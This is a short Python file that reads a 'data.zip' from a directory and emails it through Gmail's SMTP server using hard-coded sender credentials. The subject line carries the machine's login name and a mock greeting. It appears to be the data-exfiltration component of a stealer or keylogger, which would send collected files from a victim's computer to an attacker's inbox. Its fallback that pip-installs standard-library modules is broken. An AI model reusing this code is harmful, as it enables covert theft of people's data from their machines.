try:
    import os
    import smtplib
    from datetime import datetime
    from email import encoders
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
except ModuleNotFoundError:
    from subprocess import call
    call("pip install " + ' ' + 'smtplib', shell=True)
    call("pip install " + ' ' + 'datetime', shell=True)

class SendEmail:

    def __init__(self, receive_email, send_email, password, dir):
        self.receive_email = receive_email
        self.send_email = send_email
        self.password = password
        self.dir = dir + '\\' + 'data.zip'

    def send(self):

        msg = MIMEMultipart()
        msg['From'] = self.send_email
        msg['To'] = self.receive_email
        msg['Date'] = str(datetime.now())
        msg['Subject'] = str(os.getlogin()) + " just want to say hi ;)" 

        part = MIMEBase(self.dir, "octet-stream")
        part.set_payload(open(self.dir, "rb").read())
        encoders.encode_base64(part)
    
        part.add_header('Content-Disposition', 'attachment; filename="data.zip"')
        msg.attach(part)

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.send_email, self.password)
        server.sendmail(self.send_email, self.receive_email, msg.as_string())
        
        server.quit()




